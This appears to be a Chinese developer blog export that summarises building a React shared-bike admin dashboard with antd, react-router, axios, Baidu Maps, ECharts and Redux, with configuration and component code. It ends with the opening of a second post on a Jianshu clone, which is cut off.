    <url>%2F2019%2F05%2F07%2FReact%2FReact-%E5%85%B1%E4%BA%AB%E5%8D%95%E8%BD%A6%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[created by sea, 2019.5.7 起步，初始化项目npx create-react-app sharedbikes 基础依赖安装npm i react-router-domnpm i axiosnpm i jsonpnpm i moment antd 按需加载、自定义主题npm i antd npm i less less-loader // 自定义主题需要用到 less 变量覆盖功能 npm i babel-plugin-import // 按需加载所需的css 全量加载、手动加载1234567// 全量加载 会加载全部CSS样式import &#123;Button&#125; from 'antd'import 'antd/dist/antd.css'// 手动按需加载import Button from 'antd/lib/button'import 'antd/lib/button/style' // 或者 antd/lib/button/style/css 使用react-app-rewired 插件1234567891011121314151617181920212223242526272829303132// 安装 react-app-rewired 插件npm i react-app-rewired customize-cra// 修改 package.json 文件"scripts": &#123;- "start": "react-scripts start",+ "start": "react-app-rewired start",- "build": "react-scripts build",+ "build": "react-app-rewired build",- "test": "react-scripts test",+ "test": "react-app-rewired test",&#125;// 根目录下新建 config-overrides.jsconst &#123; override, fixBabelImports, addLessLoader &#125; = require('customize-cra');module.exports = override( fixBabelImports('import', &#123; libraryName: 'antd', libraryDirectory: 'es', style: true, // 'css'为加载编译好的css样式文件, true 为less文件 &#125;), // 自定义主题 addLessLoader(&#123; javascriptEnabled: true, modifyVars: &#123; '@primary-color': 'red' &#125;, &#125;),);// 此后，无需引入样式文件，会自动引入相对应样式文件import &#123; Button &#125; from 'antd' 暴露webpack配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// 暴露出config 和 scripts 两个文件夹。此操作是不可逆，因eject功能会被删除；运行此命令前需保存git,才可继续执行npm run eject// 配置webpack支持less, 在/config/webpack.config.js 中，依照sass，增加less变量，和 module 中的oneOf数组添加 less相应 配置const lessRegex = /\.less$/const lessModuleRegex = /\.module\.less$/// ...// less 降级到3.0以下,比如npm i less@2.7.3// 在babel-loader的plugins配置中增加 ["import", &#123; "libraryName": "antd", "libraryDirectory": 'es', "style": true &#125;]&#123; test: /\.(js|mjs|jsx|ts|tsx)$/, include: paths.appSrc, loader: require.resolve('babel-loader'), options: &#123; customize: require.resolve( 'babel-preset-react-app/webpack-overrides' ), plugins: [ [ require.resolve('babel-plugin-named-asset-import'), &#123; loaderMap: &#123; svg: &#123; ReactComponent: '@svgr/webpack?-svgo,+ref![path]', &#125;, &#125;, &#125;, ], // 新增的配置 按需加载 ["import", &#123; "libraryName": "antd", "libraryDirectory": 'es', "style": true // 'css'为加载编译好的css样式文件, true 为less文件 &#125; ] ], cacheDirectory: true, cacheCompression: isEnvProduction, compact: isEnvProduction, &#125;,&#125;,// 然后，修改 preProcessor 中loader 配置项if (preProcessor) &#123; // loaders.push(&#123; // loader: require.resolve(preProcessor), // options: &#123; // sourceMap: isEnvProduction &amp;&amp; shouldUseSourceMap, // &#125;, // &#125;); // 修改为 let loader = &#123; loader: require.resolve(preProcessor), options: &#123; sourceMap: shouldUseSourceMap, &#125;, &#125; if(preProcessor === "less-loader") &#123; loader.options.modifyVars = &#123; 'primary-color': '#f9c700' &#125; loader.options.javascriptEnabled = true &#125; loaders.push(loader)&#125; 项目架构 和 技术栈核心框架库：React16、Router4.0、Redux中间件和插件：Axios、Map、ECharts、AntD公共机制：菜单、权限、Header、Footer、ETable、EForm、Loading、API、Axios 基础知识 编程式实现VS声明式实现编程式实现：需要以具体代码表达在哪里（where）做什么（what）,如何实现（how）声明式实现：只需要声明在哪里（where）做什么（what）,不需要关心如何实现（how） calc() 计算方法动态计算长度值calc(四则运算）：运算符前后都需要保留一个空格width: calc(100% - 10px) //表示宽度属性是整个布局的100%减去50px的长度calc(100vh)：vh的含义相当于1%，100vh即是100% lessjs文件中导入less文件，用import ‘xx’； less导入其他less，用 @import ‘xx’ 引入，中间留空，用分号分割import ‘./index.less’;@import ‘./varable.less’; 定义变量，与scss有区别@font18: 18px; less$font18: 18px; scss CSS实现箭头图标实现下三角样式：设定border-top为指定颜色，左右border为透明色(transparent) 123456789101112.title&#123; position: relative; &amp;::after&#123; display: block; position: absolute; content: ''; left: 50%; border-top: 9px solid @colorWhite; border-left: 12px solid transparent; border-right: 12px solid transparent; &#125;&#125; 获取 url 参数, this.props.match比如 this.props.match.match.params.userId， 可拿到userId 12// 动态路由&lt;Route path='/common/order/detail/:orderId' component=&#123;OrderDetail&#125;&gt;&lt;/Route&gt; React监听事件方法绑定this 1234567891011// 手动绑定thisthis.handleClick = this.handleClick.bind(this)// 箭头函数传参() =&gt; this.handleClick('add')// 不能使用 this.handleClick('add') 会直接调用// 定义为箭头函数handleClick = () =&gt; &#123; // ...&#125; 动态传参 12345678910111213// pages/admin/ui/modal/index.jsshowMethod = (type) =&gt; &#123; Modal[type](&#123; title: 'type', content: 'some type', onOk() &#123; console.log(type) &#125; &#125;)&#125;&lt;Button onClick=&#123;() =&gt; this.showMethod('confirm')&#125;&gt;show confirm&lt;/Button&gt;&lt;Button onClick=&#123;() =&gt; this.showMethod('info')&#125;&gt;show info&lt;/Button&gt; wrappedComponentRef 拿到dom经过 Form.create 之后如果要拿到 ref，可以使用 wrappedComponentRef 1234567891011121314151617181920// pages/user/index.js// 定义 UserForm， 使用Form.create 包装成UserFormWrapclass UserForm extends Component &#123; // ...&#125;const UserFormWrap = Form.create(&#123;&#125;)(UserForm)// 调用 UserFormWrap，使用 wrappedComponentRef拿到UserFormWrap的dom&lt;UserFormWrap type=&#123;this.state.type&#125; userInfo=&#123;this.state.userInfo&#125; wrappedComponentRef=&#123;(form) =&gt; this.userForm= form&#125;/&gt;// 经过 Form.create 包装的组件将会自带 this.props.form 属性，提供了多个 API 操作表单，如getFieldDecorator实现表单数据双向绑定等// 在方法中可使用this.userFormconst userInfo = this.userForm.props.form.getFieldsValue() Easy Mock中使用 Easy Mock中使用 123456789101112131415161718192021222324252627282930313233343536373839404142&#123; "list|10": [&#123; //生成10组数据 "id|+1": 1, //自增长 "userName": '@cname', //随机生成中文名 "sex|1-2": 1, //在1-2中随机选择 &#125;], "cname": "@cname", //中文人名 "cfirst": "@cfirst", //姓名，姓 "id": "@id", //生成20 位数字 "title": "@ctitle", //中文title "city": "@city", //中文城市 "ip": "@ip", //ip 地址 "email": "@email", //email "url": "@url", //url "cword": "@cword('123456')", //123456 从中选取一个字符 "csentence": "@csentence(1,5)", //文字文段 "csentence5": "@csentence(5)", //文字文段 "cparagraph": "@cparagraph(1,3)", //文字文段 "string": "@string(11)", //输出11 个字符长度的字符串 "float": "@float(0,10)", //0 到 10 的浮点数 "int": "@integer(10,50)", //1 到 50 之间的整数 "boolean": "@boolean", //boolean 类型 true,false "boolean|1-2": true, //boolean 类型 true,false "array_sort_add|+1": ["1", "2", "3"], //数组1，2，3轮询输出 "actionType|1": ['click_url', 'open_resource_detail', 'open_resource_search'], "payload": function() &#123; var returnClickUrl = &#123; "linkUrl": "http://abc.com/efg" &#125; var returnResourceDetail = &#123; "resourceId": "606" &#125; var returnResourceSearch = &#123; "keyWords": "", "tagCategory": "1", "tag": "1" &#125; var s = this.actionType == 'click_url' ? returnClickUrl : returnResourceSearch; return s; &#125;&#125; 具体实现基础架构/index.js 项目入口12345678910111213import React from 'react';import ReactDOM from 'react-dom';import Router from './config/router'import &#123; Provider &#125; from 'react-redux'import store from './store'const App = ( &lt;Provider store=&#123;store&#125;&gt; &lt;Router /&gt; &lt;/Provider&gt;)ReactDOM.render(App, document.getElementById('root')); /config/router.js 路由。 重点是Swicth的应用，使得少了一层admin嵌套12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import React, &#123; Component &#125; from 'react'import &#123; BrowserRouter as Router, Route, Switch, Redirect &#125; from 'react-router-dom'import App from '../App'import Login from '../pages/login'import Home from '../pages/home'import Admin from '../admin'import Button from '../pages/admin/ui/button'import Modal from '../pages/admin/ui/modal'import Spin from '../pages/admin/ui/spin'import Gallery from '../pages/admin/ui/gallery'import Carousel from '../pages/admin/ui/carousel'import LoginForm from '../pages/admin/form/login'import Register from '../pages/admin/form/register'import Table from '../pages/admin/table'import City from '../pages/city'import Order from '../pages/order'import Common from '../common'import OrderDetail from '../pages/order/detail'import BikeMap from '../pages/map/bikeMap'import User from '../pages/user'import Bar from '../pages/echarts/bar'import Pie from '../pages/echarts/pie'import RichText from '../pages/richText'import Permission from '../pages/permission'import NotFound from '../pages/notFound'class IRouter extends Component &#123; render() &#123; return ( &lt;Router&gt; &lt;App&gt; &lt;Switch&gt; &lt;Route path='/login' component=&#123;Login&#125;&gt;&lt;/Route&gt; &lt;Route path='/common' render=&#123;() =&gt; &lt;Common&gt; &lt;Route path='/common/order/detail/:orderId' component=&#123;OrderDetail&#125;&gt;&lt;/Route&gt; &lt;/Common&gt; &#125;&gt; &lt;/Route&gt; &lt;Route path='/' render=&#123; () =&gt; &lt;Admin&gt; &lt;Switch&gt; &lt;Route path='/home' component=&#123;Home&#125;&gt;&lt;/Route&gt; &lt;Route path='/ui/button' component=&#123;Button&#125;&gt;&lt;/Route&gt; &lt;Route path='/ui/modal' component=&#123;Modal&#125;&gt;&lt;/Route&gt; &lt;Route path='/ui/spin' component=&#123;Spin&#125;&gt;&lt;/Route&gt; &lt;Route path='/ui/gallery' component=&#123;Gallery&#125;&gt;&lt;/Route&gt; &lt;Route path='/ui/carousel' component=&#123;Carousel&#125;&gt;&lt;/Route&gt; &lt;Route path='/form/login' component=&#123;LoginForm&#125;&gt;&lt;/Route&gt; &lt;Route path='/form/register' component=&#123;Register&#125;&gt;&lt;/Route&gt; &lt;Route path='/table' component=&#123;Table&#125;&gt;&lt;/Route&gt; &lt;Route path='/city' component=&#123;City&#125;&gt;&lt;/Route&gt; &lt;Route path='/order' component=&#123;Order&#125;&gt;&lt;/Route&gt; &lt;Route path='/user' component=&#123;User&#125;&gt;&lt;/Route&gt; &lt;Route path='/bikemap' component=&#123;BikeMap&#125;&gt;&lt;/Route&gt; &lt;Route path='/bar' component=&#123;Bar&#125;&gt;&lt;/Route&gt; &lt;Route path='/pie' component=&#123;Pie&#125;&gt;&lt;/Route&gt; &lt;Route path='/richtext' component=&#123;RichText&#125;&gt;&lt;/Route&gt; &lt;Route path='/permission' component=&#123;Permission&#125;&gt;&lt;/Route&gt; &lt;Redirect to='/home'&gt;&lt;/Redirect&gt; &lt;Route component=&#123;NotFound&#125;&gt;&lt;/Route&gt; &lt;/Switch&gt; &lt;/Admin&gt; &#125;&gt; &lt;/Route&gt; &lt;/Switch&gt; &lt;/App&gt; &lt;/Router&gt; ) &#125;&#125;export default IRouter config/menuConfig.js 菜单导航配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485const menuConfig = [ &#123; title: '首页', key: '/home' &#125;, &#123; title: 'UI', key: '/ui', children: [ &#123; title: '按钮', key: '/ui/button' &#125;, &#123; title: '弹框', key: '/ui/modal' &#125;, &#123; title: '加载', key: '/ui/spin' &#125;, &#123; title: '画廊', key: '/ui/gallery' &#125;, &#123; title: '轮播图', key: '/ui/carousel' &#125; ] &#125;, &#123; title: 'Form', key: '/form', children: [ &#123; title: '登录', key: '/form/login' &#125;, &#123; title: '注册', key: '/form/register' &#125; ] &#125;, &#123; title: 'Table', key: '/table' &#125;, &#123; title: '城市管理', key: '/city' &#125;, &#123; title: '订单管理', key: '/order' &#125;, &#123; title: '用户管理', key: '/user' &#125;, &#123; title: '车辆地图', key: '/bikemap' &#125;, &#123; title: '柱形图', key: '/bar' &#125;, &#123; title: '饼状图', key: '/pie' &#125;, &#123; title: '富文本', key: '/richtext' &#125;, &#123; title: '权限设置', key: '/permission' &#125;]export default menuConfig /App.js 。 重点是其中的 {this.props.children}12345678910111213import React, &#123; Component &#125; from 'react'class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &#123;this.props.children&#125; &lt;/div&gt; ); &#125;&#125;export default App /admin.js 。 后台系统layout布局，与一般登录、注册等页面不同12345678910111213141516171819202122import Header from './components/Header'import Footer from './components/Footer'import NavLeft from './components/NavLeft'class Admin extends Component &#123; render() &#123; return ( &lt;Row className='container'&gt; &lt;Col className='nav-left' span=&#123;4&#125;&gt; &lt;NavLeft&gt;&lt;/NavLeft&gt; &lt;/Col&gt; &lt;Col className='main' span=&#123;20&#125;&gt; &lt;Header className='header'&gt;Header&lt;/Header&gt; &#123;this.props.children&#125; &lt;Footer className='footer'&gt;&lt;/Footer&gt; &lt;/Col&gt; &lt;/Row&gt; ) &#125;&#125;export default Admin /components/NavLeft/index.js 左侧菜单栏menu, 重点是递归获取菜单列表menu1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import menuConfig from '../../config/menuConfig'import &#123; NavLink &#125; from 'react-router-dom'import &#123; connect &#125; from 'react-redux'import &#123; switchMenuAction &#125; from '../../store/actionCreators'const SubMenu = Menu.SubMenuconst Item = Menu.Itemclass NavLeft extends Component &#123; componentWillMount() &#123; const menuTree = this.getMenu(menuConfig) let currentPath = window.location.pathname this.setState(&#123; menuTree, defaultSelectedKeys: [currentPath], selectedKeys: [currentPath], defaultOpenKeys: [currentPath] &#125;) &#125; // 递归获取菜单列表menu getMenu = (data) =&gt; &#123; return data.map((item) =&gt; &#123; if(item.children) &#123; return ( &lt;SubMenu title=&#123;item.title&#125; key=&#123;item.key&#125;&gt; &#123; this.getMenu(item.children) &#125; &lt;/SubMenu&gt; ) &#125; else &#123; return ( &lt;Item key=&#123;item.key&#125;&gt; &lt;NavLink to=&#123;item.key&#125;&gt;&#123;item.title&#125;&lt;/NavLink&gt; &lt;/Item&gt; ) &#125; &#125;) &#125; handleClick = (item) =&gt; &#123; let name = item.item.props.children.props.children this.setState(&#123; selectedKeys: [item.key] &#125;) this.props.changeMenuName(name) &#125; render() &#123; const &#123; defaultSelectedKeys, selectedKeys, defaultOpenKeys &#125; = this.state return ( &lt;Fragment&gt; &lt;div className='logo'&gt; &lt;Icon className='logo-img' type="twitter" /&gt; &lt;h1&gt;Shared Bikes&lt;/h1&gt; &lt;/div&gt; &lt;Menu mode='inline' theme='dark' selectedKeys=&#123;selectedKeys&#125; defaultSelectedKeys=&#123;defaultSelectedKeys&#125; defaultOpenKeys=&#123;defaultOpenKeys&#125; onClick=&#123;this.handleClick&#125; style=&#123;&#123;textAlign: 'left'&#125;&#125; &gt; &#123;this.state.menuTree&#125; &lt;/Menu&gt; &lt;/Fragment&gt; ) &#125;&#125;const mapDispatchToProps = (dispatch) =&gt; &#123; return &#123; changeMenuName(menuName) &#123; const action = switchMenuAction(menuName) dispatch(action) &#125; &#125;&#125;export default connect(null, mapDispatchToProps)(NavLeft) 公共组件封装request 请求封装对jsonp处理和对axios做了一层封装拦截123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// request/index.jsimport JsonP from 'jsonp'import axios from 'axios'import &#123; Modal &#125; from 'antd'import Utils from '../util/util'const Axios = axiosclass request &#123; static jsonp(options) &#123; return new Promise((resolve, reject) =&gt; &#123; JsonP(options.url, &#123; param: 'callback' &#125;, (err, response) =&gt; &#123; if(err) reject(err) resolve(response) &#125;) &#125;) &#125; static requestList(that, url, params, cb) &#123; this.axios(&#123; url, params &#125;).then(res =&gt; &#123; if(res &amp;&amp; res.result) &#123; const list = res.result.item_list list.map((item) =&gt; &#123; item.key =item.id return item &#125;) that.setState(&#123; list, pagination: Utils.pagination(res.result, (current) =&gt; &#123; that.params.page = current cb() &#125;) &#125;) &#125; &#125;) &#125; static axios(options, isMock=true) &#123; let baseUrl = '' if(isMock===true) &#123; baseUrl = 'https://easy-mock.com/mock/5cc4000e429a6a46aa5d5112/sharedbikes/' &#125; else &#123; baseUrl = 'http://remote/host/' // 线上生产部署地址 &#125; return new Promise((resolve, reject) =&gt; &#123; Axios(&#123; baseURL: baseUrl, url: options.url, method: options.method || 'get', params: options.params || '', data: options.data || '', timeout: 5000 &#125;) .then((response) =&gt; &#123; if(response.status===200) &#123; let data = response.data if(data.code === 2000) &#123; resolve(data) &#125; else &#123; Modal.info(&#123; title: '提示', content: data.msg || '出错了' &#125;) &#125; &#125; else &#123; reject(response.data) &#125; &#125;) &#125;) &#125;&#125;export default request request 请求调用封装好request后，可在业务页面简化调用。 如使用request中 requestList(that, url, params, cb) 方法，获取数据，可简化如下123456789// pages/user/index.js 为例getUserList = () =&gt; &#123; let _this = this request.requestList(_this, 'user_list', _this.params, this.getUserList)&#125;componentDidMount() &#123; this.getUserList()&#125; utils 公用方法主要是时间处理、分页、下拉项12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import React from 'react'import &#123; Select &#125; from 'antd'const Option = Select.Optionconst Utils = &#123; formatDate(time) &#123; if(!time) return let date = new Date(time) let month = date.getMonth() + 1 let day = date.getDate() let hour = date.getHours() let minute = date.getMinutes() let seconds = date.getSeconds() month = this.checkGreaterThanTen(month) day = this.checkGreaterThanTen(day) hour = this.checkGreaterThanTen(hour) minute = this.checkGreaterThanTen(minute) seconds = this.checkGreaterThanTen(seconds) return date.getFullYear() + '-' + month + '-' + day + ' ' + hour+ ':' + minute + ':' + seconds &#125;, checkGreaterThanTen(num) &#123; return num = num &lt; 10 ? '0' + num : num &#125;, pagination(data, cb) &#123; return &#123; onChange: (current) =&gt; &#123; cb(current) &#125;, pageSize: data.page_size, current: data.page, total: data.total, showTotal: (total) =&gt; &#123; return `共$&#123;total&#125;页` &#125;, showQuickJumper: false &#125; &#125;, getOptionList(data) &#123; if(!data) return [] let options = [] data.map((item) =&gt; &#123; return options.push(&lt;Option value=&#123;item.id&#125; key=&#123;item.id&#125;&gt;&#123;item.name&#125;&lt;/Option&gt;) &#125;) return options &#125;&#125;export default Utils BaseForm 公共组件封装将顶部过滤表单提取出来，封装成公共组件，以便复用，也可简化业务，后期开发具体页面只需传递props123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191// BaseFormimport React, &#123; Component, Fragment &#125; from 'react'import &#123; Input, Button, Select, Checkbox, Form, DatePicker &#125; from 'antd'import Utils from '../../util/util'const FormItem = Form.Itemclass BaseForm extends Component &#123; state = &#123; orderInfo: [], orderConfirmVisble: false, &#125; params = &#123; page: 1 &#125; initFormList = () =&gt; &#123; const &#123; getFieldDecorator &#125; = this.props.form const formList = this.props.formList const formItemList = [] if(formList &amp;&amp; formList.length&gt;0) &#123; formList.forEach((item) =&gt; &#123; let type = item.type let label = item.label let field = item.field let initialValue = item.initialValue let placeholder = item.placeholder let width = item.width if(type==='Input') &#123; const INPUT = ( &lt;FormItem key=&#123;field&#125; label=&#123;label&#125; field=&#123;field&#125;&gt; &#123; getFieldDecorator(field,&#123; initialValue, &#125;)( &lt;Input style=&#123;&#123;width: width&#125;&#125; type='text' placeholder=&#123;placeholder&#125; /&gt; ) &#125; &lt;/FormItem&gt; ) formItemList.push(INPUT) &#125; else if(type==='Select') &#123; const SELECT = ( &lt;FormItem key=&#123;field&#125; label=&#123;label&#125; field=&#123;field&#125;&gt; &#123; getFieldDecorator(field,&#123; initialValue, &#125;)( &lt;Select style=&#123;&#123;width: width&#125;&#125; placeholder=&#123;placeholder&#125;&gt; &#123; Utils.getOptionList(item.list) &#125; &lt;/Select&gt; ) &#125; &lt;/FormItem&gt; ) formItemList.push(SELECT) &#125; else if (type==='Checkbox') &#123; const CKECKBOX = ( &lt;FormItem key=&#123;field&#125; label=&#123;label&#125; field=&#123;field&#125;&gt; &#123; getFieldDecorator(field,&#123; valuePropName: 'checkbox', initialValue, &#125;)( &lt;Checkbox style=&#123;&#123;width: width&#125;&#125; type='text' placeholder=&#123;placeholder&#125;&gt; &#123;label&#125; &lt;/Checkbox&gt; ) &#125; &lt;/FormItem&gt; ) formItemList.push(CKECKBOX) &#125; if(type==='DatePicker') &#123; const TIMEPICKER = ( &lt;Fragment key='DatePicker'&gt; &lt;FormItem label="选择时间" key='start_time'&gt; &#123; getFieldDecorator('start_time')( &lt;DatePicker placeholder='开始时间' showTime format='YYYY-MM-DD HH:mm:ss'&gt; &lt;/DatePicker&gt; ) &#125; &lt;/FormItem&gt; &lt;FormItem label="-" colon=&#123;false&#125; key='end_time'&gt; &#123; getFieldDecorator('end_time')( &lt;DatePicker placeholder='结束时间' showTime format='YYYY-MM-DD HH:mm:ss'&gt; &lt;/DatePicker&gt; ) &#125; &lt;/FormItem&gt; &lt;/Fragment&gt; ) formItemList.push(TIMEPICKER) &#125; &#125;) &#125; return formItemList &#125; handleFilterSubmit = () =&gt; &#123; let fieldsValue = this.props.form.getFieldsValue() this.props.filterSubmit(fieldsValue) &#125; reset = () =&gt; &#123; this.props.form.resetFields() &#125; render() &#123; return ( &lt;Form layout='inline'&gt; &lt;FormItem&gt; &#123; this.initFormList() &#125; &lt;/FormItem&gt; &lt;FormItem&gt; &lt;Button type="primary" style=&#123;&#123;margin:'0 20px'&#125;&#125; onClick=&#123;this.handleFilterSubmit&#125;&gt;查询&lt;/Button&gt; &lt;Button onClick=&#123;this.reset&#125;&gt;重置&lt;/Button&gt; &lt;/FormItem&gt; &lt;/Form&gt; ) &#125;&#125;export default Form.create(&#123;&#125;)(BaseForm)// 订单管理页面 pages/order/index.js 中调用import BaseForm from '../../components/BaseForm'import request from '../../request'class Order extends Component &#123; state = &#123; list: [], selectedRowKeys: '', selectedRowItem: &#123;&#125; &#125; params = &#123; page: 1 &#125; formList = [ &#123; type: 'Select', label: '城市', field: 'city_id', width: 100, placeholder: '全部', initialValue: 0, list: [&#123;id: 0, name: '全部'&#125;, &#123;id: 1, name: '北京'&#125;, &#123;id: 2, name: '上海'&#125;, &#123;id: 3, name: '重庆'&#125;] &#125;, &#123; type: 'DatePicker' &#125; ] // 省略了其余部分 render() &#123; return ( &lt;div className='order'&gt; &lt;Card&gt; &lt;BaseForm formList=&#123;this.formList&#125; filterSubmit=&#123;this.handleFilter&#125; /&gt; &lt;/Card&gt; &lt;/div&gt; ) &#125;&#125;export default Order 使用jsonp 跨域调用百度天气接口npm i jsonp –save12345678910111213141516171819import request from '../../request'getWeather() &#123; let city = encodeURIComponent('北京') // let ak = 'gAInfsvkT2wrwhbWG7obgNvEP7bEW2kf' let ak = '3p49MVra6urFRGOT9s8UBWr2' request.jsonp(&#123; url: 'http://api.map.baidu.com/telematics/v3/weather?location='+city+'&amp;output=json&amp;ak=' + ak &#125;) .then(res =&gt; &#123; if(res.status === 'success') &#123; const data = res.results[0].weather_data[0] this.setState(() =&gt; (&#123; weather: data.weather, dayPictureUrl: data.dayPictureUrl &#125;)) &#125; &#125;)&#125; 完整示例可查看pages/user/index.js，较为全面的范例 在网页中嵌入百度地图1234567891011121314151617181920212223// /public/index.html 引入百度地图, 将其挂载到window上// &lt;script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&amp;ak=你的密钥"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&amp;ak=gAInfsvkT2wrwhbWG7obgNvEP7bEW2kf"&gt;&lt;/script&gt;// 通过new window.BMap 使用百度地图var map = new window.BMap.Map('bikeMapContainer') //创建地图实例var point = new window.BMap.Point(116.300829, 39.915836) //创建点坐标（天安门坐标为例）map.centerAndZoom(point, 17) //以指定点为中心并缩放 （17表示层级）map.enableScrollWheelZoom(true)// this.addMapControl()// this.drawBikeRoute(res.route_list)map.enableScrollWheelZoom(true) // 启用滚轮缩放方法map.addControl(new BMap.NacigationControl()) // 添加导航控件map.addControl(new BMap.ScalControl()) //添加缩放控件map.addControl(new BMap.OverviewMapControl()) // 添加概览图控map.addControl(new BMap.MapTypeControl()) // 添加地图类型控件// 常用覆盖物 小标记/小说明/小页签let startMarker = new window.BMap.Marker(startPoint, &#123; icon: startIcon &#125;)map.addOverlay(startMarker) eCharts百度Echarts是一个基于Canvas的纯Javascript图表库，提供直观、生动、可交互、可个性化定制的数据可视化图表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// npm i echarts echarts-for-react // ReactEcharts组件中使用主题import echartsTheme from './../echartTheme'componentWillMount()&#123; echarts.registerTheme('sharedbikes', echartTheme)&#125;// 引用echarts// 方法一、加载全部echarts包（少用）import echarts from 'echarts'//方法二、按需加载import echarts from 'echarts/lib/echarts'// 必需基础组件import 'echarts/lib/component/tooltip'import 'echarts/lib/component/title'import 'echarts/lib/component/legend'import 'echarts/lib/component/markPoint'// 导入矩形图import 'echarts/lib/chart/bar'// 引用并初始化ReactEcharts：组件化开发import ReactEcharts from 'echarts-for-react'&lt;ReactEcharts option=&#123;this.getOption()&#125; notMerge=&#123;true&#125; lazyUpdate=&#123;true&#125; theme=&#123;"sharedbikes"&#125; style=&#123;&#123;height: 500&#125;&#125;/&gt;// 柱形图option 示例getOption = () =&gt; &#123; const option = &#123; title: &#123; text: '用户骑行订单' &#125;, color: ['#3398DB'], tooltip : &#123; trigger: 'axis', axisPointer : &#123; // 坐标轴指示器，坐标轴触发有效 type : 'line' // 默认为直线，可选为：'line' | 'shadow' &#125; &#125;, grid: &#123; left: '3%', right: '4%', bottom: '3%', containLabel: true &#125;, xAxis : [ &#123; type : 'category', data : ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'], axisTick: &#123; alignWithLabel: true &#125; &#125; ], yAxis : [ &#123; type : 'value' &#125; ], series : [ &#123; name:'直接访问', type:'bar', barWidth: '60%', data:[10, 52, 200, 334, 390, 330, 220] &#125; ] &#125;; return option&#125; 权限系统权限菜单设计采用RBAC权限模型(Role-Based Access Control) 即基于角色的访问控制，主要通过角色和权限建立管理，再赋予用户不同的角色，来实现权限控制的目标。 详细可查看 pages/permission/index.js 中 的实现 redux 状态管理本项目用到后台管理系统主页面的左侧菜单栏和导航面包屑需要共享状态, 使用redux 和 react-redux 管理状态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687npm i redux react-redux // index.jsimport &#123; Provider &#125; from 'react-redux'import store from './store'const App = ( &lt;Provider store=&#123;store&#125;&gt; &lt;Router /&gt; &lt;/Provider&gt;)ReactDOM.render(App, document.getElementById('root'))// store/index.jsimport &#123; createStore, compose &#125; from 'redux'import reducer from './reducer'const store = createStore(reducer, compose( window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__()))export default store// components/NavLeft/index.js 触发修改menuNameimport &#123; connect &#125; from 'react-redux'import &#123; switchMenuAction &#125; from '../../store/actionCreators'class NavLeft extends Component &#123; // 切换菜单栏，修改 handleClick = (item) =&gt; &#123; let name = item.item.props.children.props.children this.setState(&#123; selectedKeys: [item.key] &#125;) // 通过 mapStateToProps 映射方法 this.props.changeMenuName(name) &#125; render() &#123; const &#123; defaultSelectedKeys, selectedKeys, defaultOpenKeys &#125; = this.state return ( &lt;Fragment&gt; &lt;div className='logo'&gt; &lt;Icon className='logo-img' type="twitter" /&gt; &lt;h1&gt;Shared Bikes&lt;/h1&gt; &lt;/div&gt; &lt;Menu mode='inline' theme='dark' selectedKeys=&#123;selectedKeys&#125; defaultSelectedKeys=&#123;defaultSelectedKeys&#125; defaultOpenKeys=&#123;defaultOpenKeys&#125; onClick=&#123;this.handleClick&#125; &gt; &#123;this.state.menuTree&#125; &lt;/Menu&gt; &lt;/Fragment&gt; ) &#125;&#125;const mapDispatchToProps = (dispatch) =&gt; &#123; return &#123; changeMenuName(menuName) &#123; const action = switchMenuAction(menuName) dispatch(action) &#125; &#125;&#125;export default connect(null, mapDispatchToProps)(NavLeft)// components/Header/index.js 获取使用menuNameimport &#123; connect &#125; from 'react-redux'const mapStateToProps = (state) =&gt; &#123; return &#123; menuName: state.menuName &#125;&#125;export default connect(mapStateToProps, null)(Header)]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React 简书开发实战总结]]></title>
    <url>%2F2019%2F04%2F15%2FReact%2FReact-%E7%AE%80%E4%B9%A6%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Created by sea, 2019.4.7 起步，准备工作新建项目、安装脚手架npx create-react-app jianshucd jianshunpm start 绑定git远程仓库git initgit remotegit remote add origin git@github.com:Supremeyh/jianshu.git 主要技术点index.js1234567// src/index.jsimport React from 'react';import ReactDOM from 'react-dom';import TodoList from './TodoList'const rootElement = document.getElementById('root')ReactDOM.render(&lt;TodoList /&gt;, rootElement) state123456789101112131415161718// 基本用法this.setState(&#123; inputVal: 'sth...'&#125;)// 异步state,还可接收回调this.setState((prevState) =&gt; &#123; const list = [...prevState.list] list.splice(index, 1) return &#123; list &#125;&#125;)this.setState((prevState, props) =&gt; (&#123; list: [...prevState.list, &#123;text: prevState.inputVal, id: parseInt(prevState.list.length)+1&#125;], inputVal: ''&#125;), () =&gt; &#123; // cb&#125;) ref属性123456789// 下面的tar就指向了ref所在的DOM元素，将其赋值给this.input，这样this.input就等价于e.target。// this.input一旦被定义之后，在整个render方法中都可以获取到。这个属性不推荐使用，因为直接操作DOM不符合React的面向数据的思想。&lt;input ref=&#123;(tar) =&gt; &#123;this.input = tar&#125;&#125; onChange=&#123;this.handleInputChange&#125;&gt;&lt;/input&gt;handleInputChange() &#123; this.setState(() =&gt; (&#123; value: this.input.value &#125;))&#125; LifeCycle MountinggetDefaultProps 